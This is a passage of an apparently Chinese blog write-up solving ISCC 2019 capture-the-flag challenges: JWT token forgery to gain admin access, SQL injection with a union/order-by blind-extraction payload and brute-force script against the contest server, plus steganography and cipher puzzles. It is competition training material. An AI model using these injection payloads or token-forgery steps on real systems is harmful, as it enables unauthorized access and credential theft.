+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK</span><br><span class="line">omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h</span><br><span class="line">Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc</span><br><span class="line">IC+LX+9V/mpyKe9R3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>需要将网页上获得的公钥中<code>\n</code>替换成<strong>换行</strong>，并且这里<code>priv</code>之前是为<code>other</code>，需要修改为<code>admin</code>身份，用户名<code>name</code>猜测为之前认证字段的<code>iscc19</code></p>
+<p>需要额外在python2环境下安装<code>jwt</code>模块：<code>pip install PyJWT</code></p>
+<p>一开始运行可能会出现下面的报错：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>跟踪源库<code>algorithms.py</code>的源码，会发现<code>prepare_key</code>函数会检验非法字符，将检验过程去掉，再次运行</p>
+<p>得到字符串：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c</code></p>
+<p>然后将这串字符添加到头部的<code>Authorization</code>字段，附加上<code>iscc19</code>，访问<code>/list</code>，即可获得admin用户的<code>list</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>最后访问<a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277</a> </p>
+<p>即可获得flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这题也是猜用户名<code>iscc19</code>稍微要有点脑洞的，emmm做的时候运气好直接拿这个用户名来试</p>
+<p>参考文章：<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Token历险记</a></p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>这题也是道脑洞题，一开始页面只给了信息：<strong>看来你并不是Union.373组织成员，请勿入内！ </strong></p>
+<p>扫描后台也没有结果，无奈只能尝试各种<strong>HTTP头部修改</strong>的方法，最后发现是在<code>User-Agent</code>头部字段最后添加上：<code>Union.373</code></p>
+<p>开始提示我们输入用户名和密码，通过POST方式传入参数<code>username</code>和<code>password</code>后，提示我们用户密码即为flag</p>
+<p>在<code>password</code>字段加入<strong>单引号</strong>出现sql报错信息，很明显下面考察的是注出用户的<strong>密码</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>经过fuzz测试，过滤了<code>#</code>，<code>(</code>，<code>)</code>，<code>extractvalue</code>，<code>sleep</code>，<code>and</code>，<code>password</code>等关键参数，其中最致命的还是过滤了<code>()</code>，导致很多函数都无法使用</p>
+<p>使用万能密码<code>1&#39; or &#39;1</code>登陆，发现了回显了<strong>用户名</strong>信息：<code>union_373_Tom</code></p>
+<p>既然有回显，就尝试一下联合查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=union_373_Tom&amp;password=1&apos; union select 1,2,3 or &apos;</span><br></pre></td></tr></table></figure>
+<p>回显了<code>2</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>但是这里因为过滤了<strong>括号</strong>，导致我们无法使用子查询</p>
+<p>查阅了一波<strong>过滤了括号的注入方式</strong>：<a href="https://blog.csdn.net/nzjdsds/article/details/81879181" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/81879181</a> </p>
+<p>这篇文章里提到的使用<code>union order by</code>的方式进行<strong>排序盲注</strong>，思路简单而言就是通过<code>union</code>使查询结果为<code>union_373_Tom</code>和我们拼接上的一行查询结果通过<code>order by</code>对密码<code>password</code>字段进行排序，并根据回显的用户名信息来判断排序的结果</p>
+<p>下面用本地测试的过程来进行思路的说明：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>这是<code>users</code>表中的初始数据，下面我们通过<code>union</code>插入我们构造的查询结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到对第三列进行了<strong>排序</strong>，并且可以根据我们插入的不同密码字段排序结果也不同，在页面上回显的用户名信息也不同：</p>
+<ul>
+<li>union拼接的密码字段排序后比成员密码大，回显用户名：<code>union_373_Tom</code></li>
+<li>union拼接的密码字段排序后比成员密码小或相等，回显union拼接的用户名字段</li>
+</ul>
+<p>另外因为题目password字段最后还需要闭合单引号，所以采用的是<code>order by 3,&#39;1</code>，mysql会先根据逗号前面的进行排序，如果数据相等，则使用逗号后的进行排序</p>
+<p>所以最后使用的盲注payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=union_373_Tom&amp;password=1&apos; or &apos;1&apos; union select 1,&apos;hhx&apos;,&apos;1&apos; from admin order by 3,&apos;1</span><br></pre></td></tr></table></figure>
+<p>我们知道<code>order by</code>是对字符串一位位的比较，所以思路就是对<code>union_373_Tom</code>的密码字段进行逐位的排序比较，根据回显的用户名，如果插入的密码字段大于用户名密码字段，则需要</p>
+<p>最后需要弄清楚<code>order by</code>排序的原理，测试了好久，排序其实是根据字符<code>ascii</code>码的大小，另外mysql中大小写的字符的排序是相同的，测试后的字典序列为<code>_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210</code></p>
+<p>脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8054"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Union.373'</span></span><br><span class="line">    &#125;</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">s = <span class="string">"_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 "</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        p = password + j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'union_373_Tom'</span>,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">"1' or '1' union select 1,'hhx','"</span>+p+<span class="string">"' from admin order by 3,'1"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hhx'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'password:'</span>,password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>最后的密码为<code>1SCC_2OI9</code></p>
+<p>flag：<code>flag{1SCC_2OI9}</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\20.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>8进制转16进制，16进制转字符串，最后base64解密得flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$s = <span class="string">"0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113"</span>;</span><br><span class="line">$message = explode(<span class="string">" "</span>, $s);</span><br><span class="line">$m = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($message);$i++)&#123;</span><br><span class="line">	$m = $m.base_convert($message[$i],<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">$m = hex2bin($m);</span><br><span class="line"><span class="keyword">echo</span> base64_decode($m);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Flag: <code>ISCC{N0_0ne_can_st0p_y0u}</code></p>
+<h3 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h3><p>用<strong>Stegsolve</strong>工具打开</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="\img\ISCC2019\21.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure> 
+<p>根据<strong>倒立屋</strong>题目提示，flag就是IsCc_2019倒过来 </p>
+<p><img src="\img\ISCC2019\22.png" alt=""> </p>
+<h3 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h3><p>键盘密码，网上有现成脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">STR = <span class="string">"RFVGYHNWSXCDEWSXCVWSXCVTGBNMJUY,WSXZAQWDVFRQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVT,QWERTYTRFVBGRDXCVBNBVCXSWERFTYUIOJMTGBNMJUMNBVCDRTGHUWSXCDEQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYTRFVGWSXCVGRDXCVBCVGREDQWERTY(TRFVBTYUIOJMTRFVG),QWERTYGRDXCVBQWERTYTYUIOJMEFVTNBVCXSWERFWSXCDEQWERTYTGBNMJUYTRFVGQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMTGBNMJUYIUYHNBVNBVCXSWERFTGBNMJUYMNBVCDRTGHUTYUIOJM,QWERTYWSXIUYHNBVQWERTYGRDXCVBQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVTQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFWSXCDETYUIOJMWSXTYUIOJMWSXTGBNMJUYZAQWDVFR.QWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYTGBNMJUIUYHNBVTGBNMJUGRDXCVBWSXCVWSXCVEFVTQWERTYWSXCFEWSXCDEIUYHNBVWSXCVGREDZAQWDVFRWSXCDEWSXCFEQWERTYTYUIOJMTGBNMJUYQWERTYIUYHNBVWSXCDEMNBVCDRTGHUEFVGYWSXCDEQWERTYGRDXCVBIUYHNBVQWERTYGRDXCVBZAQWDVFRQWERTYWSXCDEWSXCFETGBNMJUTRFVBGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYWSXCDERGNYGCWSXCDEMNBVCDRTGHUTRFVBWSXIUYHNBVWSXCDEQWERTYTYUIOJMTGBNMJUYQWERTYCVGREDWSXEFVGYWSXCDEQWERTYNBVCXSWERFGRDXCVBMNBVCDRTGHUTYUIOJMWSXTRFVBWSXNBVCXSWERFGRDXCVBZAQWDVFRTYUIOJMIUYHNBVQWERTYWSXCDERGNYGCNBVCXSWERFWSXCDEMNBVCDRTGHUWSXWSXCDEZAQWDVFRTRFVBWSXCDEQWERTYWSXZAQWDVFRQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXZAQWDVFRCVGREDQWERTYGRDXCVBQWERTYXSWEFTYHNGRDXCVBTRFVBRFVGYHNWSXZAQWDVFRWSXCDE,QWERTYGRDXCVBIUYHNBVQWERTYEFVGYWDCFTWSXCDEWSXCVWSXCVQWERTYGRDXCVBIUYHNBVQWERTYTRFVBTGBNMJUYZAQWDVFRWSXCFETGBNMJUTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYTYUIOJMTGBNMJUYQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYIUYHNBVTGBNMJUYMNBVCDRTGHUTYUIOJMQWERTYTGBNMJUYTRFVGQWERTYGRDXCVBTYUIOJMTYUIOJMGRDXCVBTRFVBQAZSCEIUYHNBVQWERTYTRFVGTGBNMJUYTGBNMJUZAQWDVFRWSXCFEQWERTYWSXZAQWDVFRQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBWSXCVQWERTYEFVGYWDCFTTGBNMJUYMNBVCDRTGHUWSXCVWSXCFEQWERTY(WSX.WSXCDE.,QWERTYYHNMKJTGBNMJUCVGREDQWERTYYHNMKJTGBNMJUYTGBNMJUZAQWDVFRTYUIOJMEFVTQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNIUYHNBVQWERTYWSXZAQWDVFRQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTRFVGWSXCDEIUYHNBVIUYHNBVWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYIUYHNBVWSXCDETYUIOJMTYUIOJMWSXZAQWDVFRCVGREDIUYHNBV).QWERTYRFVGYHNWSXCDEMNBVCDRTGHUWSXCDEQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYEFVTTGBNMJUYTGBNMJUMNBVCDRTGHUQWERTYTRFVGWSXCVGRDXCVBCVGRED&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;QWERTYMNBVCDRTGHUWSXCDEEFVGYWSXCDEMNBVCDRTGHUIUYHNBVWSXCDE-WSXCDEZAQWDVFRCVGREDWSXZAQWDVFRWSXCDEWSXCDEMNBVCDRTGHUWSXZAQWDVFRCVGRED,QWERTYZAQWDVFRWSXCDETYUIOJMEFVGYWDCFTTGBNMJUYMNBVCDRTGHUQAZSCEQWERTYIUYHNBVZAQWDVFRWSXTRFVGTRFVGWSXZAQWDVFRCVGRED,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTYUIOJMTGBNMJUYTRFVBTGBNMJUYWSXCVQWERTYGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBV,QWERTYIUYHNBVEFVTIUYHNBVTYUIOJMWSXCDEXSWEFTYHNQWERTYGRDXCVBWSXCFEXSWEFTYHNWSXZAQWDVFRWSXIUYHNBVTYUIOJMMNBVCDRTGHUGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFR,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNXSWEFTYHNWSXZAQWDVFRCVGRED,QWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYGRDXCVBWSXCVWSXCVQWERTYIUYHNBVQAZSCEWSXWSXCVWSXCVIUYHNBVQWERTYEFVGYWDCFTRFVGYHNWSXTRFVBRFVGYHNQWERTYRFVGYHNGRDXCVBEFVGYWSXCDEQWERTYYHNMKJWSXCDEWSXCDEZAQWDVFRQWERTYMNBVCDRTGHUWSXCDEQAZXCDEWVTGBNMJUWSXMNBVCDRTGHUWSXCDEWSXCFEQWERTYYHNMKJEFVTQWERTYNBVCXSWERFMNBVCDRTGHUWSXTGBNMJUYMNBVCDRTGHUQWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBTYUIOJMQWERTYWSXCFEWSXCDETRFVGQWERTYTRFVBTGBNMJUYZAQWDVFR."</span></span><br><span class="line">STR = STR.replace(<span class="string">"WSXCDE"</span>,<span class="string">'e'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"RFVGYHN"</span>,<span class="string">'h'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSXCV"</span>,<span class="string">'l'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TGBNMJUY"</span>,<span class="string">'o'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TGBNMJU"</span>,<span class="string">'u'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"GRDXCVB"</span>,<span class="string">'a'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"CVGRED"</span>,<span class="string">'g'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QWERTYTRFVG"</span>,<span class="string">'f'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSXCFE"</span>,<span class="string">'d'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"IUYHNBV"</span>,<span class="string">'s'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QWERTY"</span>,<span class="string">' '</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TRFVB"</span>,<span class="string">'c'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QAZSCE"</span>,<span class="string">'k'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"NBVCXSWERF"</span>,<span class="string">'p'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"MNBVCDRTGHU"</span>,<span class="string">'r'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSX"</span>,<span class="string">'i'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"EFVT"</span>,<span class="string">'y'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"YHNMKJ"</span>,<span class="string">'b'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"ZAQWDVFR"</span>,<span class="string">'n'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'XSWEFTYHNXSWEFTYHN'</span>,<span class="string">'m'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'EFVGYWDCFT'</span>,<span class="string">'w'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'TYUIOJM'</span>,<span class="string">'t'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'QAZXCDEWV'</span>,<span class="string">'t'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'XSWEFTYHN'</span>,<span class="string">'m'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'EFVGY'</span>,<span class="string">'v'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'RGNYGC'</span>,<span class="string">'x'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'TRFVG'</span>, <span class="string">'f'</span>)</span><br><span class="line">print((STR).upper())</span><br></pre></td></tr></table></figure>
+<p>flag：<code>FLAG{ISCC KEYBOARD CIPHER}</code></p>
+<h3 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h3><p>帧分析，8张图片拼成一张图片 </p>
+<p><img src="\img\ISCC2019\23.png" alt=""> </p>
+<p>图片末尾最后一串：</p>
+<p>U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==</p>
+<p>BASE64解密后得到Salted__P开头的字符，推测是<strong>AES加密</strong></p>
+<p>但是网站直接解密失败，猜测有加密的密钥，尝试密钥为拼成图片里的<strong>ISCC</strong></p>
+<p>解密得U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ==</p>
+<p>再次以密钥为ISCC进行一次AES解密，就能得到flag了</p>
+<p>flag：<code>flag{DugUpADiamondADeepDarkMine}</code></p>
+<h3 id="他们能在一起吗"><a href="#他们能在一起吗" class="headerlink" title="他们能在一起吗"></a>他们能在一起吗</h3><p>扫描二维码得到</p>
+<p><a href="http://47.92.76.208:4000/static/uploads/095a88fe28aa0a1d44a904afeae6f69f/Reply.png" target="_blank" rel="noopener">UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=</a></p>
+<p>进行base64和url解码得到：<strong>PASS{0K_I_L0V3_Y0u!}</strong></p>
+<p>分析二维码图片，发现其中还藏有其他文件</p>
+<p>用binwalk和dd分离出压缩包，<strong>dd if=Reply.png of=1.zip skip=8121 bs=1</strong></p>
+<p>其中有文件<strong>You won’t Wanna see this.txt</strong>，解压密码就是0K_I_L0V3_Y0u!</p>
+<p>flag：<code>ISCC{S0rrY_W3_4R3_Ju5T_Fr1END}</code></p>
+<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>分离文件得到Welcome.txt，是一串密文，以为是什么加密方式，其实规律在于空格，每个句子一个空格代表0，两个空格代表1，最后得到一串二进制转ascii即可得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條'</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="string">' '</span> <span class="keyword">and</span>  s[i+<span class="number">1</span>] != <span class="string">' '</span> <span class="keyword">and</span> s[i<span class="number">-1</span>] != 